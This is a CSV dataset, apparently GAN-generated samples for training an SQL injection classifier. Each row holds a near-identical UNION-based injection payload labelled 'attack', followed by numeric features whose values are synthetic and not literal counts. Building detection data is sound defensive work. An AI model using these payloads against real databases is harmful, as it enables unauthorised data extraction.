id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000089,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6882092108900704,78.20954895019531,29.32164764404297,19.09026336669922,14.389531135559082,-0.13414643704891205,33.632991790771484,11.872810363769531,1.0106651782989502,0.3350949287414551,0.27073484659194946,0.199639230966568,0.14199121296405792,3.707383871078491,0.6326359510421753,0.3334086835384369,1.935471773147583,0.38476333022117615,-0.08210049569606781,0.077449731528759,0.31938719749450684,1.2884881496429443,4.917903423309326,0.01776639185845852,0.4767880141735077,0.2810273766517639,0.11253968626260757,0.09032225608825684,0.1407594531774521,0.39907020330429077,0.49423685669898987,-0.18898282945156097,0.08471702039241791,0.20768797397613525,1.0300902128219604,0.8998576402664185,0.20528441667556763,0.050082381814718246,1.2841699123382568,0.7228055000305176,0.7977521419525146,0.20938633382320404,0.16241568326950073,-0.18837234377861023,0.16846944391727448,-0.07907657325267792,-0.08394698798656464,0.03492147475481033,0.10102578997612,0.29022350907325745,-0.2793481945991516,-0.060211677104234695,-0.08434813469648361,0.15173792839050293,-0.05685005336999893,-0.034667111933231354,0.17609763145446777,0.25854551792144775,-0.05319702625274658,0.24304060637950897,0.022758513689041138,0.19129732251167297,-0.10489112138748169,0.10313507914543152,0.22268596291542053,0.06799858808517456,0.07269139587879181,0.07575628906488419,0.0782211422920227,0.04505178704857826,-0.008062221109867096,-0.29342058300971985,0.09699539095163345,0.0030854344367980957,0.21888674795627594,0.40742993354797363,0.02496112696826458,0.033599548041820526,-0.23348668217658997,0.0794457346200943,-0.08275345712900162,3.7268314361572266,0.14434246718883514,1.2733638286590576,0.0570501908659935,0.10553278028964996,-0.12574677169322968,0.015148084610700607,0.006562630645930767
GAN_000090,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.402510737016143,78.3075180053711,30.845903396606445,18.10834312438965,15.726296424865723,0.19015224277973175,32.41389465332031,11.669382095336914,1.1854588985443115,0.37763655185699463,0.23584622144699097,0.2085174322128296,0.14225922524929047,3.7334144115448,0.715721070766449,0.34333622455596924,1.931625247001648,0.3690645098686218,-0.10476034879684448,0.08940166980028152,0.2792307436466217,1.301539659500122,5.2293267250061035,0.025779815390706062,0.5360503792762756,0.09989579766988754,0.12984877824783325,0.09039156138896942,0.10423419624567032,0.34699180722236633,0.4569230377674103,-0.08940783143043518,0.06401453167200089,0.21766403317451477,1.0442450046539307,0.7209276556968689,0.14714209735393524,0.05390244349837303,1.3019558191299438,0.991701066493988,0.7232488393783569,0.23043911159038544,0.07533271610736847,-0.0476810559630394,0.011964000761508942,-0.005581505596637726,-0.25974351167678833,0.16107529401779175,-0.009262694045901299,0.08100831508636475,-0.2873323857784271,0.01451224647462368,-0.14683470129966736,0.037627629935741425,0.03358180820941925,-0.0793953612446785,0.037142861634492874,0.027601931244134903,0.10424819588661194,0.010936867445707321,-0.07340306043624878,0.17858223617076874,-0.013352639973163605,-0.05402560532093048,0.10107230395078659,-0.057494569569826126,0.005086518824100494,-0.002364620566368103,0.12608492374420166,-0.0008049383759498596,0.054367903620004654,-0.19542565941810608,0.04202256351709366,0.06416231393814087,0.18981078267097473,0.41658270359039307,0.01592397689819336,0.045809075236320496,-0.07318314164876938,-0.028617577627301216,-0.12384726852178574,3.5799806118011475,0.09856069833040237,1.142158031463623,-0.08838305622339249,0.03393979370594025,-0.13619138300418854,0.1074536144733429,-0.00430600019171834
GAN_000091,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4995311575501153,78.24142456054688,29.72895050048828,17.959468841552734,15.105061531066895,0.024651842191815376,32.18218231201172,11.654086112976074,1.1405284404754639,0.36023804545402527,0.23761583864688873,0.21028000116348267,0.14123128354549408,3.7013933658599854,0.5713624954223633,0.36226460337638855,2.002737283706665,0.3643398582935333,-0.034354716539382935,0.03918581083416939,0.31836771965026855,1.3516942262649536,5.001683235168457,0.026825333014130592,0.47263678908348083,0.2707371115684509,0.09741846472024918,0.050184816122055054,0.14024730026721954,0.31114140152931213,0.4441494047641754,-0.06384508311748505,0.0026987791061401367,0.12795929610729218,1.0334136486053467,0.7080127000808716,0.1898857057094574,0.07628469914197922,1.2888799905776978,0.9034994840621948,0.7661541700363159,0.17298923432826996,0.024651750922203064,-0.07504383474588394,0.07019619643688202,-0.15017908811569214,-0.1975044310092926,0.1573823094367981,0.17286889255046844,0.18071161210536957,-0.2704758942127228,-0.10362739115953445,-0.11426196247339249,0.1206779032945633,-0.0008418858051300049,-0.08947008103132248,0.04253779724240303,0.1161898523569107,-0.018077462911605835,0.036030933260917664,0.03837645798921585,0.2040761411190033,-0.1425141543149948,-0.06258498877286911,0.30904456973075867,0.04593830183148384,0.03355395793914795,0.05165078490972519,0.12973397970199585,0.029433749616146088,-0.06982242316007614,-0.31529074907302856,0.08806818723678589,-0.0718497633934021,0.2615935802459717,0.41510146856307983,0.013442804105579853,-0.0013433108106255531,-0.02564648538827896,0.09724408388137817,-0.11735256761312485,3.4118454456329346,0.11407551914453506,1.0673352479934692,-0.051570139825344086,0.14086611568927765,-0.031291183084249496,0.012959346175193787,-0.003932033199816942
GAN_000092,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.798348058532345,78.24342346191406,27.209064483642578,17.711772918701172,15.003094673156738,0.01899542100727558,36.4422492980957,12.068256378173828,0.9657877683639526,0.3247436285018921,0.25689443945884705,0.19719013571739197,0.14112192392349243,3.693361282348633,0.44897931814193726,0.3145487606525421,1.8856173753738403,0.43626123666763306,-0.3033953905105591,0.04644118621945381,0.27105602622032166,1.2946678400039673,4.51102876663208,0.02962908148765564,0.44959893822669983,0.3110070824623108,0.07082630693912506,0.015033244155347347,0.05664319545030594,0.314008891582489,0.41917240619659424,-0.14304418861865997,0.1298919916152954,0.06771786510944366,1.0274924039840698,0.8004986643791199,0.1917974352836609,0.09318266063928604,1.2684245109558105,0.9502817392349243,0.7411090731620789,0.2160743623971939,0.27633437514305115,-0.12203649431467056,0.4165797233581543,-0.16777080297470093,-0.01562415063381195,0.003208855167031288,0.11036387085914612,0.23069903254508972,-0.45286160707473755,-0.24875211715698242,0.04534750059247017,0.09010165929794312,-0.12611989676952362,-0.12133906036615372,0.21723642945289612,0.16054552793502808,-0.16123364865779877,0.3398529291152954,0.013109073042869568,-0.19896090030670166,-0.12056668102741241,0.005077026784420013,0.429977685213089,0.0618542917072773,0.036526426672935486,-0.021154671907424927,0.08168409764766693,-0.03301466256380081,-0.01542644202709198,-0.25517916679382324,-0.004277322441339493,-0.009569346904754639,0.20784954726696014,0.44450637698173523,0.02892635017633438,0.03986601531505585,-0.1728176474571228,0.3980092406272888,0.05232561007142067,3.731212854385376,0.13396932184696198,1.2308080196380615,-0.012598425149917603,0.06538131833076477,-0.036426082253456116,-0.10791309922933578,0.010950496420264244
GAN_000093,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7737514104755077,78.14923095703125,27.697519302368164,16.52519989013672,15.075393676757812,-0.15292201936244965,35.38115310668945,11.89562702178955,1.103263020515442,0.30015406012535095,0.2421637922525406,0.19757473468780518,0.14066483080387115,3.692337989807129,0.6168200969696045,0.33620136976242065,1.806048035621643,0.4054567515850067,-0.30699554085731506,0.008843651041388512,0.21406260132789612,1.321372151374817,4.088230133056641,0.02905767410993576,0.4528678059577942,0.12714184820652008,0.010039824061095715,0.007680184207856655,0.012598708271980286,0.25955453515052795,0.538420557975769,0.08121985197067261,-0.1285279095172882,0.238552987575531,1.0460882186889648,0.5286224484443665,0.12118149548768997,-0.03171515837311745,1.1782360076904297,1.0746474266052246,0.6663938164710999,0.23972156643867493,0.004007749259471893,-0.188516765832901,0.17537666857242584,-0.11247162520885468,-0.21632985770702362,-0.08650656044483185,-0.0761149451136589,0.10441090911626816,-0.4791995584964752,0.023882590234279633,-0.030549608170986176,0.07593925297260284,-0.08919419348239899,-0.15721115469932556,-0.06471038609743118,0.17523998022079468,0.013561025261878967,0.057834215462207794,-0.08154246211051941,0.18558436632156372,0.017614178359508514,-0.049608077853918076,0.3374837338924408,0.12635943293571472,0.1142416000366211,0.07902108877897263,0.05743911489844322,-0.10718550533056259,-0.03575371950864792,-0.24131670594215393,0.07423410564661026,0.19837671518325806,0.08564919978380203,0.5175041556358337,0.02053981088101864,-0.023853862658143044,-0.23572519421577454,0.0753815770149231,0.0638127475976944,3.4655041694641113,0.16716906428337097,1.1852753162384033,-0.21709179878234863,0.053245965391397476,0.0030302703380584717,0.19714407622814178,-0.0159913320094347
GAN_000094,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5510316932464914,78.2806396484375,28.803804397583008,18.740549087524414,16.73456573486328,0.27251943945884705,34.47945785522461,11.5586576461792,0.8947805762290955,0.3510642945766449,0.236114040017128,0.21041560173034668,0.14004187285900116,3.71999454498291,0.49171772599220276,0.3552304208278656,1.9602214097976685,0.39304521679878235,0.024087239056825638,0.08217673003673553,0.19116902351379395,1.4466102123260498,5.1589555740356445,0.02883872576057911,0.47933003306388855,0.2713100016117096,0.06449843943119049,0.030695049092173576,0.120539091527462,0.3474472761154175,0.4213859438896179,-0.09787244349718094,-0.02110709249973297,0.01580476202070713,1.0351922512054443,0.7191609144210815,0.19559124112129211,0.13162386417388916,1.2386109828948975,0.8740981817245483,0.6592752933502197,0.21845565736293793,-0.058928877115249634,-0.03254878520965576,0.0635223537683487,-0.18289706110954285,-0.16696494817733765,0.1353091299533844,0.15394364297389984,0.15121705830097198,-0.2531469762325287,-0.2534599006175995,-0.03323657810688019,0.15444926917552948,-0.031364068388938904,-0.07632981985807419,0.025260718539357185,0.14641183614730835,-0.024538882076740265,-0.0020744726061820984,0.10019681602716446,-0.044258762151002884,-0.16200993955135345,-0.1062687337398529,0.18225200474262238,-0.018252871930599213,-0.14739122986793518,0.06933756917715073,0.19779545068740845,0.19829651713371277,-0.06147327274084091,-0.17173919081687927,0.035249270498752594,0.06519247591495514,0.28222718834877014,0.37181904911994934,0.03456057235598564,0.045184165239334106,-0.007271893322467804,0.043959230184555054,-0.07178693264722824,3.4421308040618896,0.10865777730941772,1.1613258123397827,-0.0798741802573204,-0.09052371233701706,-0.0042233578860759735,-0.008516136556863785,-0.001626250916160643
GAN_000095,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.53968804198433,78.42628479003906,29.097707748413086,16.252416610717773,14.994473457336426,0.04904397204518318,34.04277801513672,11.869364738464355,0.9178569316864014,0.36915645003318787,0.26143887639045715,0.20199403166770935,0.14488284289836884,3.740701675415039,0.606974720954895,0.2447519749403,1.7287191152572632,0.4106036126613617,-0.13943073153495789,0.07502168416976929,0.3018755614757538,1.2098320722579956,4.511831760406494,0.02463921718299389,0.5002040863037109,0.22757960855960846,0.09146713465452194,0.017914628610014915,0.04110513627529144,0.36185041069984436,0.4537780284881592,-0.20968136191368103,-0.029144741594791412,0.02854612097144127,1.0197381973266602,0.7651697993278503,0.20628829300403595,0.0923214852809906,1.3373006582260132,1.005776286125183,0.7340785264968872,0.22730328142642975,0.13248570263385773,-0.07995963841676712,0.21240364015102386,-0.04284064471721649,-0.13677570223808289,0.010989667847752571,-0.007197486236691475,0.21765349805355072,-0.2931019365787506,-0.10870195180177689,0.02281908318400383,0.07130008935928345,-0.020616430789232254,-0.1884360909461975,-0.02302134782075882,0.03816165775060654,-0.008549116551876068,0.26397448778152466,-0.06061083450913429,-0.07443264871835709,-0.09165644645690918,0.0696975439786911,0.245573490858078,0.07926096022129059,-0.07875040173530579,0.2083868384361267,0.05522982403635979,-0.03520389646291733,0.04253162071108818,-0.11097406595945358,0.18789079785346985,0.010616853833198547,0.14753083884716034,0.37681707739830017,0.015765737742185593,0.03861624747514725,-0.1737147569656372,0.18376848101615906,0.07865849882364273,3.8150746822357178,0.15886977314949036,1.1116300821304321,0.06797449290752411,0.13177429139614105,-0.02281833440065384,0.10170678794384003,0.0043438635766506195
GAN_000096,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.680271059200282,78.01811218261719,30.496097564697266,17.161806106567383,14.738300323486328,-0.10942982137203217,33.895809173583984,12.020674705505371,1.187972068786621,0.3186734914779663,0.2535576820373535,0.2042493373155594,0.13885639607906342,3.6549158096313477,0.5255919098854065,0.4208214581012726,2.0378260612487793,0.3710429072380066,-0.2249917834997177,0.01805184595286846,0.30444061756134033,1.3169316053390503,4.830455303192139,0.02713865414261818,0.4323856830596924,0.10331638157367706,0.09462589770555496,0.019372260197997093,0.04132352024316788,0.29434552788734436,0.4386877417564392,0.055733904242515564,-0.03321017324924469,0.2003403902053833,1.0585416555404663,0.6967387795448303,0.1369525045156479,0.02483169361948967,1.241161584854126,1.018607497215271,0.7546127438545227,0.20431414246559143,0.04715638607740402,-0.11522644013166428,0.2154833823442459,-0.13407887518405914,-0.19068828225135803,0.07304374873638153,0.0006202235817909241,0.2017224282026291,-0.6161428689956665,-0.10738302767276764,-0.04822402447462082,0.21240019798278809,-0.06002563238143921,-0.22731196880340576,0.21356266736984253,0.12051926553249359,0.08766166865825653,0.1848030537366867,-0.006573155522346497,0.05241809040307999,-0.1504829376935959,-0.04339677840471268,0.4288601875305176,0.05415356531739235,0.21572153270244598,-0.0229647234082222,0.08686691522598267,-0.06008409708738327,0.05483965948224068,-0.2597576677799225,0.06940531730651855,0.08902871608734131,0.2807014286518097,0.4316391944885254,0.028742795810103416,0.023020675405859947,-0.16331002116203308,0.07750292867422104,-0.09299422055482864,3.3634655475616455,0.12790408730506897,1.1486608982086182,-0.12440044432878494,0.12920281291007996,0.0036104582250118256,0.04119244962930679,-0.006094515789300203
GAN_000097,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.405358998669148,78.2940673828125,31.139169692993164,18.113567352294922,15.208883285522461,0.08591260015964508,32.22893524169922,11.658966064453125,1.22380530834198,0.3790346384048462,0.24419844150543213,0.20665337145328522,0.14214052259922028,3.7334017753601074,0.672027587890625,0.2933010458946228,1.8672922849655151,0.3638651371002197,-0.14948342740535736,0.10723881423473358,0.31635722517967224,1.2868481874465942,5.128802299499512,0.022154534235596657,0.5089384913444519,0.10658257454633713,0.12312071770429611,0.08926104754209518,0.09881298989057541,0.3061559796333313,0.4740428626537323,-0.0806317925453186,0.07059753686189651,0.1993027627468109,1.0441932678222656,0.73109370470047,0.18856947124004364,0.06922140717506409,1.3181896209716797,0.9792133569717407,0.7303128838539124,0.2233695238828659,0.09471192210912704,-0.06792929023504257,0.07146956026554108,-0.050317153334617615,-0.18705016374588013,0.11204174160957336,0.06876955926418304,0.07117331773042679,-0.2571086585521698,-0.08985226601362228,-0.086580790579319,0.011445045471191406,-0.01870209537446499,-0.14403998851776123,0.09472930431365967,0.05545731633901596,0.030735328793525696,0.12760525941848755,-0.04802646115422249,0.13186626136302948,-0.02482067048549652,-0.05878676846623421,0.277675062417984,0.058089617639780045,0.054949551820755005,0.02436637133359909,0.07772821187973022,-0.08958625048398972,-0.010259278118610382,-0.25772181153297424,-0.0003349483013153076,-0.005085349082946777,0.1770532727241516,0.4098978042602539,0.012293077073991299,0.041449666023254395,-0.08948514610528946,0.07899917662143707,-0.07129790633916855,3.550783157348633,0.10230150818824768,1.1536022424697876,-0.0851401761174202,0.1225559338927269,-0.14553207159042358,0.0002751089632511139,-0.006519862916320562
GAN_000098,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5443107958555458,78.25084686279297,28.68963623046875,18.362218856811523,15.864803314208984,-0.17833255231380463,34.573692321777344,11.733607292175293,0.9968425035476685,0.37899065017700195,0.23988986015319824,0.20732714235782623,0.14240513741970062,3.7502357959747314,0.5908313989639282,0.31676727533340454,1.8081605434417725,0.4010491371154785,-0.07527507841587067,0.10504349321126938,0.32488390803337097,1.4000465869903564,5.371897220611572,0.02873321622610092,0.489664226770401,0.18032850325107574,0.08784816414117813,0.03493820130825043,0.02419840544462204,0.34073179960250854,0.4071825444698334,-0.14950576424598694,-0.026039816439151764,0.021874966099858284,1.041113018989563,0.8132084012031555,0.21806105971336365,0.07779527455568314,1.3013627529144287,1.0053441524505615,0.6798679232597351,0.22031879425048828,-0.010938674211502075,-0.14268147945404053,0.19076938927173615,-0.06214553117752075,-0.24514615535736084,0.06279640644788742,0.13079281151294708,0.1532951444387436,-0.3885001838207245,-0.2474936544895172,-0.04846770316362381,0.008618071675300598,-0.0643795058131218,-0.25153496861457825,0.010425489395856857,0.027716580778360367,0.01710967719554901,0.17254969477653503,0.08269374817609787,-0.05479806661605835,-0.08451952040195465,-0.07350532710552216,0.1344553828239441,0.050874579697847366,-0.10260103642940521,-0.02766469120979309,0.08468607068061829,0.06555117666721344,0.05503044277429581,-0.054011210799217224,0.06466902047395706,0.04021114856004715,0.3154268264770508,0.3619714081287384,0.027642004191875458,0.09151571989059448,-0.08415815979242325,0.229964017868042,-0.014638066291809082,3.655803918838501,0.14921925961971283,1.1849591732025146,-0.06157387048006058,0.04433750361204147,-0.08183181285858154,0.16922204196453094,0.0036602637264877558
GAN_000099,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7252675508900186,77.77259063720703,26.474632263183594,17.468017578125,15.32160758972168,0.06264092028141022,33.30471420288086,11.84763240814209,1.09248948097229,0.3629346489906311,0.24686293303966522,0.2104618400335312,0.13950824737548828,3.7153854370117188,0.4781516492366791,0.38595566153526306,1.9821478128433228,0.39134612679481506,-0.014584876596927643,0.12729470431804657,0.280217707157135,1.3959848880767822,5.475360870361328,0.039082661271095276,0.40387243032455444,0.35324856638908386,0.068470299243927,0.06452247500419617,0.13366647064685822,0.29406923055648804,0.5002509951591492,-0.06416089832782745,-0.04025809466838837,0.13487422466278076,1.0312331914901733,0.6179113984107971,0.1536128669977188,-0.03208431974053383,1.1906962394714355,0.9220107793807983,0.7597759366035461,0.18186427652835846,0.057209502905607224,-0.017690785229206085,0.1772639900445938,-0.26598602533340454,-0.23058408498764038,0.21886616945266724,0.29434725642204285,0.14949144423007965,-0.3527154326438904,-0.24285894632339478,-0.003878280520439148,0.09190070629119873,-0.1445048451423645,-0.19126996397972107,0.0922178328037262,0.14848250150680542,-0.14043016731739044,-0.18885435163974762,0.1386190950870514,0.10703355073928833,-0.23994453251361847,-0.13063326478004456,0.22941972315311432,0.07491175830364227,-0.16987860202789307,0.024368606507778168,0.20286504924297333,0.08017051219940186,-0.1226610466837883,-0.43572208285331726,-0.10534867644309998,0.0661676675081253,0.23544901609420776,0.4096754491329193,0.02688150852918625,-0.08127648383378983,-0.09439487010240555,0.28847184777259827,-0.11192072182893753,3.247443675994873,0.09740505367517471,1.045548439025879,-0.2664422392845154,0.08799721300601959,-0.035557735711336136,0.13035374879837036,-0.023664288222789764
GAN_000100,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6750986278206272,78.22154235839844,26.65508460998535,16.158641815185547,15.107620239257812,-0.1915840357542038,36.18671417236328,11.929671287536621,0.9288827180862427,0.3675483763217926,0.242292582988739,0.20306921005249023,0.14443925023078918,3.698248863220215,0.4895983636379242,0.3480306565761566,1.6946427822113037,0.40133559703826904,-0.2751058340072632,0.048958245664834976,0.3015750050544739,1.351399540901184,4.746268272399902,0.03952861949801445,0.5553569197654724,0.24577581882476807,0.0684175193309784,0.007832436822354794,-0.04065664857625961,0.32069316506385803,0.40434032678604126,-0.07305777072906494,-0.11276794224977493,-0.013756908476352692,1.0442724227905273,0.7513293623924255,0.1554296463727951,0.016903232783079147,1.312667727470398,1.0919727087020874,0.745591938495636,0.20328371226787567,-0.07414291799068451,-0.10646260529756546,0.3501255512237549,-0.08241894841194153,-0.33721446990966797,-0.0001381058245897293,-0.09156246483325958,0.22263704240322113,-0.49185675382614136,-0.0976460874080658,-0.1635279655456543,0.17111745476722717,0.06645873934030533,-0.45854508876800537,-0.1509392261505127,-0.055378492921590805,0.27006471157073975,0.1592469960451126,0.09392792731523514,0.0049668848514556885,-0.19540299475193024,-0.08806567639112473,0.19046439230442047,0.13038738071918488,-0.0294177383184433,0.2899188697338104,0.0032386668026447296,0.000705815851688385,0.03140730783343315,-0.09251554310321808,0.10449300706386566,0.036478541791439056,0.28690066933631897,0.4085318148136139,0.021412132307887077,0.05230552330613136,-0.18284815549850464,0.1435537338256836,0.07890070974826813,3.736830472946167,0.1749078333377838,1.1238617897033691,0.0036663860082626343,-0.07230157405138016,-0.22383131086826324,0.2941666841506958,0.001581768854521215
GAN_000101,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8407747610551697,77.93824768066406,24.82676887512207,19.359323501586914,15.52505874633789,-0.5954856276512146,37.42369842529297,12.092708587646484,1.0554043054580688,0.33802175521850586,0.2507305443286896,0.19140519201755524,0.14362318813800812,3.7350242137908936,0.7484240531921387,0.3563026189804077,1.8400245904922485,0.4258151054382324,-0.25477921962738037,0.12167342752218246,0.29926738142967224,1.3433269262313843,5.600788593292236,0.026141401380300522,0.38862425088882446,0.18206727504730225,-0.022367073222994804,-0.00447677168995142,0.026606492698192596,0.314334899187088,0.49368563294410706,-0.28978070616722107,0.03434933349490166,0.1871381253004074,1.0212067365646362,0.6959424018859863,0.16511768102645874,-0.0282711423933506,1.177140712738037,1.019119381904602,0.7797226905822754,0.13779345154762268,0.03945055603981018,-0.05467252433300018,0.31429553031921387,-0.03767399489879608,-0.11316639930009842,0.2109401673078537,0.2315138429403305,0.328273743391037,-0.40851184725761414,-0.05796279385685921,-0.07535173743963242,-0.15948675572872162,-0.20419718325138092,-0.20133861899375916,0.08951513469219208,0.162016823887825,-0.04113262891769409,0.2098039984703064,-0.050704676657915115,0.32253411412239075,-0.12941090762615204,0.036091148853302,0.039253681898117065,0.08776025474071503,-0.23785901069641113,0.14025527238845825,0.15471461415290833,0.007252782583236694,-0.1901092231273651,-0.16463226079940796,0.18819038569927216,0.13778510689735413,0.27146264910697937,0.42924633622169495,0.015533911064267159,-0.05871669203042984,-0.16722065210342407,0.3441784381866455,-0.18669193983078003,3.584620475769043,0.1674862802028656,1.294530987739563,-0.29041558504104614,0.07903021574020386,-0.03959163278341293,0.43132901191711426,-0.004183702636510134
GAN_000102,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,4.125866645991972,77.80292510986328,29.38083267211914,17.729982376098633,15.414071083068848,-1.0257503986358643,34.38413619995117,12.042133331298828,0.9565846920013428,0.2927964925765991,0.24796250462532043,0.2030932456254959,0.13950341939926147,3.673933982849121,0.5997011065483093,0.5519110560417175,2.125094413757324,0.33852702379226685,0.06168967857956886,0.05175172910094261,0.39428386092185974,1.5244390964508057,5.580101490020752,0.02327367663383484,0.2755427658557892,0.30460140109062195,0.08647654205560684,-0.07803664356470108,0.09784962236881256,0.3595147430896759,0.4255469739437103,-0.1380779892206192,-0.2226911187171936,0.15896481275558472,1.0081968307495117,0.5644713640213013,0.13092684745788574,-0.012206543236970901,1.1862980127334595,0.918621301651001,0.8286483287811279,0.16043680906295776,0.03170116990804672,-0.0783776119351387,0.30593812465667725,-0.25814780592918396,-0.14671796560287476,0.2803286015987396,0.27176645398139954,0.47064703702926636,-0.6073681116104126,-0.20720762014389038,0.1354096382856369,0.22111651301383972,-0.2695826292037964,-0.3803047835826874,0.2376330941915512,0.11973360180854797,0.01921972632408142,0.24933280050754547,0.12340819090604782,-0.04074886441230774,-0.3199101686477661,-0.28097569942474365,0.3445928692817688,0.1168355941772461,-0.071525439620018,0.16653531789779663,0.15388454496860504,0.0957995280623436,-0.18352586030960083,-0.33230772614479065,0.07633670419454575,0.0033040642738342285,0.5059844255447388,0.35778120160102844,0.03792896494269371,-0.074855737388134,-0.23640865087509155,0.17878632247447968,-0.11736509948968887,2.9147443771362305,0.19234980642795563,1.0194940567016602,-0.2768028676509857,0.15769071877002716,0.20608285069465637,0.19727866351604462,-0.0064721438102424145
GAN_000103,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.078122350856938,78.43717956542969,25.888755798339844,13.81539249420166,14.414840698242188,-0.5276481509208679,37.93571472167969,12.492286682128906,0.821650505065918,0.2952542006969452,0.2948882579803467,0.19943203032016754,0.14169378578662872,3.707674264907837,0.44259271025657654,0.42263516783714294,1.7371346950531006,0.39528927206993103,-0.22683845460414886,-0.018770867958664894,0.24540702998638153,1.3111801147460938,3.7339439392089844,0.02389189600944519,0.49491459131240845,0.20325927436351776,0.03631662204861641,-0.10073178261518478,0.04124818742275238,0.31503453850746155,0.546373188495636,-0.07575380802154541,-0.13015633821487427,0.035060301423072815,1.0319020748138428,0.5935678482055664,0.1326208859682083,0.029905911535024643,1.2738643884658813,1.1652612686157227,0.7184027433395386,0.13450631499290466,-0.06449325382709503,0.02620292454957962,0.316700279712677,-0.21798619627952576,0.020326614379882812,-0.09464195370674133,0.0731569230556488,0.3534447252750397,-0.7037704586982727,-0.19007737934589386,-0.02130892127752304,0.1518564224243164,-0.211599200963974,-0.3342810273170471,-0.03023175150156021,0.1570945680141449,0.1239161342382431,0.3072391450405121,0.014778442680835724,-0.0616631880402565,-0.10362334549427032,-0.10495033860206604,0.3853519558906555,0.0260569266974926,0.14325226843357086,0.4058091640472412,-0.05451550707221031,0.013062655925750732,-0.0018573924899101257,-0.15133869647979736,0.3227349519729614,0.06998991966247559,0.21099144220352173,0.3931090235710144,0.03254764899611473,0.025309568271040916,-0.32463857531547546,0.24265079200267792,0.2546946704387665,3.3847599029541016,0.19794195890426636,1.0261439085006714,0.15430624783039093,0.0017918869853019714,0.1951841413974762,0.1102416068315506,-0.005536115262657404
